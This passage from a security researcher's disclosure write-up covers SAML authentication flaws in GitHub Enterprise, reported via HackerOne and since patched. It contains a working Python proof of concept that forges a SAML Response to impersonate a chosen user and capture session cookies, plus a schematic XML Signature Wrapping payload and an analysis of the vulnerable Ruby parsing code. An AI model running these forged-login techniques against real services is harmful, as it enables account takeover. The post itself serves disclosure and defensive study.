    &lt;span class="n"&gt;relay_state&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;saml_message&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'RelayState'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="n"&gt;encoded_saml_request&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;saml_message&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'SAMLRequest'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="c1"&gt;# inflate and decode the request&lt;/span&gt;
    &lt;span class="n"&gt;saml_request&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;zlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decompress&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unquote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encoded_saml_request&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;# get the AuthnRequest ID so that we can reply&lt;/span&gt;
    &lt;span class="n"&gt;to_reply_to&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r'ID=&amp;quot;([_A-Za-z0-9]*)&amp;quot;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;saml_request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;M&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;now&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'{0}Z'&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utcnow&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isoformat&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'.'&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;not_after&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'{0}Z'&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utcnow&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timedelta&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;minutes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isoformat&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'.'&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="c1"&gt;#Now load a dummy SAML Response from file and manipulate necessary fields&lt;/span&gt;
    &lt;span class="n"&gt;saml_response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'''&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;ns0:Response Destination=&amp;quot;{5}&amp;quot;
  ID=&amp;quot;id-ijkXTw5GmzOJrShaq&amp;quot;
  InResponseTo=&amp;quot;{0}&amp;quot;
  IssueInstant=&amp;quot;{1}&amp;quot; Version=&amp;quot;2.0&amp;quot;
  xmlns:ns0=&amp;quot;urn:oasis:names:tc:SAML:2.0:protocol&amp;quot; xmlns:ns1=&amp;quot;urn:oasis:names:tc:SAML:2.0:assertion&amp;quot;&amp;gt;
  &amp;lt;ns1:Issuer Format=&amp;quot;urn:oasis:names:tc:SAML:2.0:nameid-format:entity&amp;quot;&amp;gt;https://idp.ikakavas.gr&amp;lt;/ns1:Issuer&amp;gt;
  &amp;lt;ns0:Status&amp;gt;
    &amp;lt;ns0:StatusCode Value=&amp;quot;urn:oasis:names:tc:SAML:2.0:status:Success&amp;quot;/&amp;gt;
  &amp;lt;/ns0:Status&amp;gt;
  &amp;lt;ns1:Assertion ID=&amp;quot;id-MnRkvbCYnZ7YQ9vP5&amp;quot;
    IssueInstant=&amp;quot;{1}&amp;quot; Version=&amp;quot;2.0&amp;quot;&amp;gt;
    &amp;lt;ns1:Issuer Format=&amp;quot;urn:oasis:names:tc:SAML:2.0:nameid-format:entity&amp;quot;&amp;gt;{2}&amp;lt;/ns1:Issuer&amp;gt;
    &amp;lt;ns1:Subject&amp;gt;
      &amp;lt;ns1:NameID
        Format=&amp;quot;urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified&amp;quot;&amp;gt;{3}&amp;lt;/ns1:NameID&amp;gt;
      &amp;lt;ns1:SubjectConfirmation Method=&amp;quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&amp;quot;&amp;gt;
        &amp;lt;ns1:SubjectConfirmationData
          InResponseTo=&amp;quot;{0}&amp;quot;
          NotOnOrAfter=&amp;quot;{4}&amp;quot; Recipient=&amp;quot;{5}&amp;quot;/&amp;gt;
      &amp;lt;/ns1:SubjectConfirmation&amp;gt;
    &amp;lt;/ns1:Subject&amp;gt;
    &amp;lt;ns1:Conditions NotBefore=&amp;quot;{1}&amp;quot; NotOnOrAfter=&amp;quot;{4}&amp;quot;&amp;gt;
      &amp;lt;ns1:AudienceRestriction&amp;gt;
        &amp;lt;ns1:Audience&amp;gt;{6}&amp;lt;/ns1:Audience&amp;gt;
      &amp;lt;/ns1:AudienceRestriction&amp;gt;
    &amp;lt;/ns1:Conditions&amp;gt;
    &amp;lt;ns1:AuthnStatement AuthnInstant=&amp;quot;{1}&amp;quot; SessionIndex=&amp;quot;id-bBMbAuaPOePnBgNTx&amp;quot;&amp;gt;
      &amp;lt;ns1:AuthnContext&amp;gt;
        &amp;lt;ns1:AuthnContextClassRef&amp;gt;urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport&amp;lt;/ns1:AuthnContextClassRef&amp;gt;
      &amp;lt;/ns1:AuthnContext&amp;gt;
    &amp;lt;/ns1:AuthnStatement&amp;gt;
  &amp;lt;/ns1:Assertion&amp;gt;
&amp;lt;/ns0:Response&amp;gt;'''&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;to_reply_to&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ISSUER&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;NAMEID&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;not_after&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;RECIPIENT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AUDIENCE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;'SAMLResponse'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
            &lt;span class="s1"&gt;'RelayState'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;relay_state&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="c1"&gt;#Post the SAML Response to the ACS endpoint&lt;/span&gt;
    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;saml_client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;RECIPIENT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;allow_redirects&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;# we expect a redirect on successful authentication&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="mi"&gt;300&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;399&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="c1"&gt;# Print the cookies for verification&lt;/span&gt;
        &lt;span class="n"&gt;pprint&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pprint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_dict&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The above would print out something like the following:&lt;/p&gt;
&lt;pre class="code literal-block"&gt;
{'_fi_sess': 'eyJsYXN0X3dyaXRlIjoxNDg0MDY0NjMxNzU3LCJmbGFzaCI6eyJkaXNjYXJkIjpbXSwiZmxhc2hlcyI6eyJhbmFseXRpY3NfZGltZW5zaW9uIjp7Im5hbWUiOiJkaW1lbnNpb241IiwidmFsdWUiOiJMb2dnZWQgSW4ifX19LCJzZXNzaW9uX2lkIjoiMzM2OGFiYmFjOGVjMWQxNGZiYjhmNDAzMGRiNWFkZGQifQ%3D%3D--c9219c7ba29e5285a76275c2a0a5dcbb12925fcb',
'_gh_render': 'BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiRTZlMmNjZTBmN2RjMGM3MDExMGI3%0AMzVkMjcxYjZkOGY5MTQxMTE0Yzg2NDMwOGFkM2EzZDE5OTU1MjJiMTRkMGEG%0AOwBGSSIPdXNlcl9sb2dpbgY7AEZJIg10ZXN0dXNlcgY7AFQ%3D%0A--ae525ab90dee2157dec9890cdb147c569ff5e6b8',
'dotcom_user': 'testuser',
'logged_in': 'yes',
'user_session': 'yoF_AlS0VMFsZjBzj8mLF9Wk_Ne1YpCv57y_T1rTy-FEfD_dWHUHd3pqz07hXxODk0hhms_8gVxICuBQ'}
&lt;/pre&gt;
&lt;p&gt;and setting the &lt;cite&gt;user_session&lt;/cite&gt; session cookie in a browser would log the attacker in as the impersonated user.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="disclosure"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id15"&gt;Disclosure&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;I submitted the report via Hackerone on January 10th. I receive and acknowledgement some hours later, the issue was triaged the next day and a new GHE &lt;a class="reference external" href="https://enterprise.github.com/releases/2.8.6/notes"&gt;release&lt;/a&gt; was out on January 12th.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="xml-signature-wrapping-attacks"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id16"&gt;XML Signature Wrapping Attacks&lt;/a&gt;&lt;/h3&gt;
&lt;div class="section" id="overiew"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id17"&gt;Overiew&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Next weekend I found myself with some time to spare so I thought I'd give my testing software another spin in order to look for more issues. I have a test suite that would attempt all attacks described in the &lt;a class="reference external" href="https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/somorovsky"&gt;2012 paper&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Running the tool, it reported quite quickly that the implementation is vulnerable to a specific XML Signature Wrapping (XSW) attack, caused by the fact that the part that validates the signature and the part that implements business logic have different views on the data.
GHE SAML SP implementation was vulnerable to a crafted SAML Response that contains two SAML Assertions. Assuming the Legitimate Assertion is LA, the Forged Assertion is FA and LAS is the signature of the Legitimate Assertion, the malicious crafted SAML Response would look like this:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
&amp;lt;SAMLRespone&amp;gt;
  &amp;lt;FA ID=&amp;quot;evil&amp;quot;&amp;gt;
      &amp;lt;Subject&amp;gt;Attacker&amp;lt;/Subject&amp;gt;
  &amp;lt;/FA&amp;gt;
  &amp;lt;LA ID=&amp;quot;legitimate&amp;quot;&amp;gt;
      &amp;lt;Subject&amp;gt;Legitimate User&amp;lt;/Subject&amp;gt;
      &amp;lt;LAS&amp;gt;
         &amp;lt;Reference Reference URI=&amp;quot;legitimate&amp;quot;&amp;gt;
         &amp;lt;/Reference&amp;gt;
      &amp;lt;/LAS&amp;gt;
  &amp;lt;/LA&amp;gt;
&amp;lt;/SAMLResponse&amp;gt;
&lt;/pre&gt;
&lt;p&gt;Upon receiving such a SAML response, GHE would successfully verify and consume it creating a session for &lt;strong&gt;Attacker&lt;/strong&gt;, instead of &lt;strong&gt;Legitimate User&lt;/strong&gt;, even if FA is &lt;strong&gt;not&lt;/strong&gt; signed.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id1"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id18"&gt;Details&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Let's see why GHE is vulnerable to this attack by taking a look at the de-obfuscated source code as before:&lt;/p&gt;
&lt;p&gt;The basic problem is that the implementers made an assumption that there will always be only one Assertion in a SAML response.&lt;/p&gt;
&lt;p&gt;The verification process for an incoming SAML Response starts at &lt;cite&gt;/data/github/current/lib/github/authentication/saml.rb&lt;/cite&gt; in&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;rails_authenticate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;where the incoming SAML Message is used to create an instance of &lt;cite&gt;SAML::Message::Response&lt;/cite&gt;&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="n"&gt;saml_response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;SAML&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Message&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;from_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:SAMLResponse&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;cite&gt;from_param()&lt;/cite&gt; from &lt;cite&gt;/data/github/current/lib/saml/message.rb&lt;/cite&gt; base64 decodes the response, and then calls build() which in turn calls
parse() from &lt;cite&gt;/data/github/current/lib/saml/message/response.rb`&lt;/cite&gt; In &lt;cite&gt;parse()&lt;/cite&gt; the
&lt;a class="reference external" href="http://www.rubydoc.info/github/sparklemotion/nokogiri/Nokogiri/XML/Searchable#at_xpath-instance_method"&gt;at_xpath&lt;/a&gt;
and
&lt;a class="reference external" href="http://www.rubydoc.info/github/sparklemotion/nokogiri/Nokogiri/XML/Searchable#at-instance_method"&gt;at&lt;/a&gt;
methods of &lt;a class="reference external" href="www.nokogiri.org"&gt;Nokogiri&lt;/a&gt; are used extensively in order
to search in the SAML Response for a given XPath and assign the text
value of the node to a variable.&lt;/p&gt;
&lt;p&gt;This is the first part of the problem and this is how the business logic
gets its view of the SAML Response. Since &lt;cite&gt;at_xpath&lt;/cite&gt; and &lt;cite&gt;at&lt;/cite&gt; have
the well documented property of matching and retrieving &lt;strong&gt;only&lt;/strong&gt; the
first result, no matter how many results are there, all variables below&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="n"&gt;issuer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Response/Issuer&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Response/Issuer&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;
&lt;span class="n"&gt;issuer&lt;/span&gt; &lt;span class="o"&gt;||=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Response/Assertion/Issuer&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Response/Assertion/Issuer&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;
&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Response/Status/StatusCode&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;second_level_status_code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Response/Status/StatusCode/StatusCode&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;status_message&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Response/Status/StatusMessage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;authn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//AuthnStatement&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;conditions&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Response/Assertion/Conditions&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;audience_text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Response/Assertion/Conditions/AudienceRestriction&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Response/Assertion/Conditions/AudienceRestriction/Audience&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Response/Assertion/Conditions/AudienceRestriction/Audience&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;
&lt;span class="n"&gt;attribute_statements&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Response/Assertion/AttributeStatement&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;subject&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Subject&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Subject&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;
&lt;span class="n"&gt;name_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Subject/NameID&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Subject/NameID&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;
&lt;span class="n"&gt;name_id_format&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Subject/NameID&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Subject/NameID&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Format&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
